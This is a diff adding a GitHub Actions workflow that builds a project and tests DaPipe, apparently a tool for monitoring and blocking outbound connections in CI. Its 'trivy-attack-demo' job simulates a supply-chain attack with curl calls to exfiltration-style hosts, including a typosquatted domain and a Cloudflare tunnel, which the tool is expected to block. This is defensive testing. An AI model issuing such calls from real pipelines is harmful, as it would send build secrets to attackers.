@@ -1,0 +1,70 @@
+name: CI
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      # ── DaPipe Setup (monitor mode — learn what domains the build uses) ──
+      - name: DaPipe Setup
+        uses: ./
+        with:
+          step: setup
+          mode: monitor
+          baseline-path: .dapipe/baseline.json
+
+      # ── Normal CI steps — DaPipe monitors all outbound connections ──
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 20
+          cache: npm
+
+      - run: npm ci
+      - run: npx tsc --noEmit
+
+      # ── DaPipe Analyze — report on observed connections ──
+      - name: DaPipe Analyze
+        if: always()
+        uses: ./
+        with:
+          step: analyze
+          mode: monitor
+          baseline-path: .dapipe/baseline.json
+
+  # ── Dogfood: simulate the Trivy supply-chain attack ──
+  trivy-attack-demo:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: DaPipe Setup (restrict mode)
+        uses: ./
+        with:
+          step: setup
+          mode: restrict
+          baseline-path: .dapipe/baseline.json
+
+      # Simulate a compromised action trying to exfiltrate secrets
+      - name: Simulated Trivy attack
+        run: |
+          echo "Simulating compromised trivy-action..."
+          # These should all be BLOCKED by DaPipe
+          curl -sf --max-time 3 https://scan.aquasecurtiy.org/exfil 2>/dev/null || true
+          curl -sf --max-time 3 https://tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io 2>/dev/null || true
+          curl -sf --max-time 3 https://plug-tab-protective-relay.trycloudflare.com 2>/dev/null || true
+          echo "Attack simulation complete."
+
+      - name: DaPipe Analyze (expect blocks)
+        if: always()
+        uses: ./
+        with:
+          step: analyze
+          mode: restrict
+          baseline-path: .dapipe/baseline.json
